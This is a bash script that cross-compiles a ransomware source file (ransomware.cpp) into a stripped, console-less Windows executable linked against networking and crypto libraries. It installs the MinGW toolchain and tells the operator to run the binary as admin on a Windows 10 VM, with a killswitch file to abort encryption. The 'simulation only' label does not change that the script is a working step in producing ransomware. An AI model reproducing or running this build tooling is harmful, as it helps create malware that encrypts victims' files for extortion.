#!/bin/bash
# build_ransomware.sh - Cross-Compile Script with Explicit Linking (Native Windows Crypto)
# FOR SIMULATION ONLY.

# Install deps (if not already)
sudo apt update
sudo apt install mingw-w64 g++-mingw-w64-x86-64 gcc-mingw-w64-x86-64 mingw-w64-common -y

# Paths
SOURCE="ransomware.cpp"
OUTPUT="ransomware.exe"

# Cross-compile for Windows x64 (static, no console, explicit libs for MinGW)
x86_64-w64-mingw32-g++ -o $OUTPUT $SOURCE -static-libgcc -static-libstdc++ -mwindows -O2 -s -lwininet -lcrypt32 -ladvapi32

# Check
if [ -f "$OUTPUT" ]; then
    echo "Theoretical EXE built successfully: $OUTPUT (Size: $(ls -lh $OUTPUT | awk '{print $5}'))"
    echo "Verify: $(file $OUTPUT)"
    echo "Transfer to Windows 10 VM and run as admin."
    echo "Create 'C:\\killswitch.txt' to abort encryption."
else
    echo "Build failed. Check compiler output above."
    echo "Troubleshoot: Run 'x86_64-w64-mingw32-g++ -v' for verbose; ensure no typos in SOURCE."
fi